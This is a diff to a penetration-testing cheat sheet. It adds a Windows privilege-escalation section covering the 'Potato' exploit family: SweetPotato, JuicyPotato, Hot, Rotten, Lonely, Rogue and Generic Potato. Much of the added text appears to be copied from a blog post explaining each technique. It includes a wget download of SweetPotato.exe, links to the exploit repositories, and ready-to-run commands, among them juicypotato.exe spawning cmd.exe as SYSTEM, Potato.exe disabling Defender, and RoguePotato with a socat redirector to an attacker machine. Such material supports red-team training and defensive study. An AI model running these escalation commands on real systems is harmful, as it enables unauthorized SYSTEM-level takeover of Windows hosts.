@@ -72,10 +72,14 @@
   - [SSH for Windows plink exe](#SSH-for-Windows-plink-exe)
   - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
   - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
-- [Enumeration](#Enumeration)
 - [Privilige Escalation](#Privilige-Escalation)
   - [sweetpotato](#sweetpotato)
   - [JuicyPotato](#JuicyPotato)
+  - [hotpotato](#hotpotato)
+  - [rottenpotato](#rottenpotato)
+  - [lonelypotato](#lonelypotato)
+  - [roguepotato](#roguepotato)
+  - [genericpotato](#genericpotato)
 
 
 
@@ -991,18 +995,256 @@ Connecting to a Web Server using HTTP-Proxy & NTLM Auth
 ```
 python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 ```
-
-
-## Enumeration 
+ 
 
 ## Privilige Escalation
 
 ### sweetpotato
+```
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
+```
 download exe binary with:
 ```
 wget https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe
 ```
 
+Sweet Potato
+Sweet Potato is a collection of various native Windows privilege escalation techniques from service accounts to SYSTEM. It has been created by @EthicalChaos and includes:
+
+RottenPotato
+
+Weaponized JuciyPotato with BITS WinRM discovery
+
+PrintSpoofer discovery and original exploit
+
+EfsRpc built on EfsPotato
+
+PetitPotam
+
+It is the definitelly potatoe, a potatoe to rule them all.
+
+Exploitation
+Download the binary from the repository: Here
+```
+https://github.com/CCob/SweetPotato
+```
+```
+./SweetPotato.exe
+
+  -c, --clsid=VALUE          CLSID (default BITS:
+                               4991D34B-80A1-4291-83B6-3328366B9097)
+  -m, --method=VALUE         Auto,User,Thread (default Auto)
+  -p, --prog=VALUE           Program to launch (default cmd.exe)
+  -a, --args=VALUE           Arguments for program (default null)
+  -e, --exploit=VALUE        Exploit mode
+                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]
+  -l, --listenPort=VALUE     COM server listen port (default 6666)
+  -h, --help                 Display this help
+```
+
+
+
+
+
 ### JuicyPotato
+```
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
+```
+
+Juicy Potato
+Juicy Potato is Rotten Potato on steroids. It allows a more flexible way to exploit the vulnerability. In this case, ohpe & decoder during a Windows build review found a setup where BITS was intentionally disabled and port 6666 was taken, therefore Rotten Potato PoC won’t work.
+
+What are BITS and CLSID?
+CLSID is a globally unique identifier that identifies a COM class object. It is an identifier like UUID.
+Background Intelligent Transfer Service (BITS) is used by programmers and system administrators to download files from or upload files to HTTP web servers and SMB file shares. The point is that BITs implements the IMarshal interface and allows the proxy declaration to force the NTLM Authentication.
+Rotten Potato’s PoC used BITS with a default CLSID
+```
+// Use a known local system service COM server, in this cast BITSv1
+Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
+```
+They discovered that other than BITS there are several out of process COM servers identified by specific CLSIDs that could be abused. They need al least to:
+
+Be instantiable by the current user, normally a service user which has impersonation privileges
+Implement the IMarshal interface
+Run as an elevated user (SYSTEM, Administrator, …)
+And they found a lot of them: http://ohpe.it/juicy-potato/CLSID/
+
+What are the advantages?
+We do not need to have a meterpreter shell
+We can specify our COM server listen port
+We can specify with CLSID to abuse
+Exploitation
+Download the binary from the repository: Here
+```
+https://github.com/ohpe/juicy-potato
+```
+```
+juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+```
+Does this still works?
+Same case as Rotten potato.
+
+### hotpotato
+```
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
+```
+Hot Potato
+Hot Potato was the first potato and was the code name of a Windows privilege escalation technique discovered by Stephen Breen @breenmachine. This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012.
+
+How does this works?
+![image](https://user-images.githubusercontent.com/24814781/180617915-894293d4-648b-4d5e-924b-e8ed5c9f39fa.png)
+  
+Therefore, the vulnerability uses the following:
+
+1. Local NBNS Spoofer: To impersonate the name resolution and force the system to download a malicious WAPD configuration.
+2. Fake WPAD Proxy Server: Deploys a malicios WAPD configuration to force the system to perform a NTLM authentication
+3. HTTP -> SMB NTLM Relay: Relays the WAPD NTLM token to the SMB service to create an elevated process.
+
+Exploitation
+Download the binary from the repository: Here  
+```
+https://github.com/foxglovesec/Potato
+```
+```
+Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
+```
+Is this vulnerability exploitable right now?
+Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.
+
+  
+### rottenpotato
+```
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
+```
+
+Rotten Potato
+Rotten Potato is quite complex, but mainly it uses 3 things:
+
+1. RPC that is running through NT AUTHORITY/SYSTEM that is going to try to authenticate to our local proxy through the CoGetInstanceFromIStorage API Call.
+2. RPC in port 135 that is going to be used to reply all the request that the first RPC is performing. It is going to act as a template.
+3. AcceptSecurityContext API call to locally impersonate NT AUTHORITY/SYSTEM
+
+![image](https://user-images.githubusercontent.com/24814781/180618032-1a3b4645-5e3b-4339-8859-92cc60d39d08.png)
 
 
+1. Trick RPC to authenticate to the proxy with the CoGetInstanceFromIStorage API call. In this call the proxy IP/Por t is specified.
+2. RPC send a NTLM Negotiate package to the proxy.
+3. The proxy relies the NTLM Negotiate to RPC in port 135, to be used as a template. At the same time, a call to AcceptSecurityContext is performed to force a local authentication. Notice that this package is modified to force the local authentication.
+4. & 5. RPC 135 and AcceptSecurityContext replies with a NTLM Challenge . The content of both packets are mixed to match a local negotiation and is forwarded to the RPC, step 6..
+7. RPC responds with a NLTM Auth package that is send to AcceptSecurityContext (8.) and the impersonation is performed (9.).
+
+ 
+Exploitation
+Download the binary from the repository: Here
+```
+https://github.com/breenmachine/RottenPotatoNG
+```
+After having a meterpreter shell with incognito mode loaded:
+```
+MSFRottenPotato.exe t c:\windows\temp\test.bat
+```
+Is this vulnerability exploitable right now?
+Decoder analyzed if this technique could be exploited in the latest Windows version, in this blog post: https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
+
+To sum up:
+
+DCOM does not talk to our local listeners, so no MITM and no exploit.
+
+Sending the packets to a host under our control listening on port 135, and then forward the data to our local COM listener does not work. The problem is that in this case, the client will not negotiate a Local Authentication.
+
+Therefore, this technique won’t work on versions >= Windows 10 1809 & Windows Server 2019
+
+### lonelypotato
+```
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
+```
+
+Lonely Potato
+Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the “incognito” module made by Decoder.
+
+https://decoder.cloud/2017/12/23/the-lonely-potato/
+
+Is this vulnerability exploitable right now?
+Lonely Potato is deprecated and after visiting the repository, there is an indication to move to Juicy Potato.
+```
+https://github.com/decoder-it/lonelypotato
+```
+OBS: just switch to juicypotato or something else!
+
+### roguepotato
+```
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
+```
+
+Rogue Potato
+After reading fixes regarding Rotten/Juicy potato, the following conclusions can be drawn:
+
+You cannot specify a custom port for OXID resolver address in latest Windows versions
+If you redirect the OXID resolution requests to a remote server on port 135 under your control and the forward the request to your local Fake RPC server, you will obtain only an ANONYMOUS LOGON.
+If you resolve the OXID Resolution request to a fake RPC Server, you will obtain an identification token during the IRemUnkown2 interface query.
+How does this works?
+
+![image](https://user-images.githubusercontent.com/24814781/180618225-24ffa2fb-bc31-4262-9929-74d6e9c157a6.png)
+
+Rogue Potato instruct the DCOM server to perform a remote OXID query by specifying a remote IP (Attacker IP)
+On the remote IP, setup a “socat” listener for redirecting the OXID resolutions requests to a fake OXID RPC Server
+The fake OXID RPC server implements the ResolveOxid2 server procedure, which will point to a controlled Named Pipe [ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]].
+The DCOM server will connect to the RPC server in order to perform the IRemUnkown2 interface call. By connecting to the Named Pipe, an “Autentication Callback” will be performed and we could impersonate the caller via RpcImpersonateClient() call.
+Then, a token stealer will:
+Get the PID of the rpcss service
+Open the process, list all handles and for each handle try to duplicate it and get the handle type
+If handle type is “Token” and token owner is SYSTEM, try to impersonate and launch a process with CreatProcessAsUser() or CreateProcessWithToken()
+
+To dig deeper read the author’s blog post: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
+
+What do you need to make it work?
+You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim
+Upload both exe files from the PoC. In fact it is also possible to launch the fake OXID Resolver in standalone mode on a Windows machine under our control when the victim’s firewall won’t accept incoming connections.
+More info: https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html
+
+Exploitation
+Download the binary from the repository: Here
+```
+https://github.com/antonioCoco/RoguePotato
+```
+Run in your machine the socat redirection (replace VICTIM_IP):
+```
+socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
+```
+Execute PoC (replace YOUR_IP and command):
+```
+.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
+```
+
+### genericpotato
+```
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
+```
+
+Generic Potato
+Wait, another potato? Yes. Generic Potato is a modified version of SweetPotato by @micahvandeusen to support impersonating authentication over HTTP and/or named pipes.
+
+This allows for local privilege escalation from SSRF and/or file writes. It is handy when:
+
+The user we have access to has SeImpersonatePrivilege
+The system doesn’t have the print service running which prevents SweetPotato.
+WinRM is running preventing RogueWinRM
+You don’t have outbound RPC allowed to any machine you control and the BITS service is disabled preventing RoguePotato.
+How do we abuse this? All we need is to cause an application or user with higher privileges to authenticate to us over HTTP or write to our named pipe. GenericPotato will steal the token and run a command for us as the user running the web server, probably system. More information ca be found here
+
+Exploitation
+Download the binary from the repository: Here
+```
+https://github.com/micahvandeusen/GenericPotato
+```
+```
+.\GenericPotato.exe
+
+  -m, --method=VALUE         Auto,User,Thread (default Auto)
+  -p, --prog=VALUE           Program to launch (default cmd.exe)
+  -a, --args=VALUE           Arguments for program (default null)
+  -e, --exploit=VALUE        Exploit mode [HTTP|NamedPipe(default)]
+  -l, --port=VALUE           HTTP port to listen on (default 8888)
+  -i, --host=VALUE           HTTP host to listen on (default 127.0.0.1)
+  -h, --help                 Display this help
+```
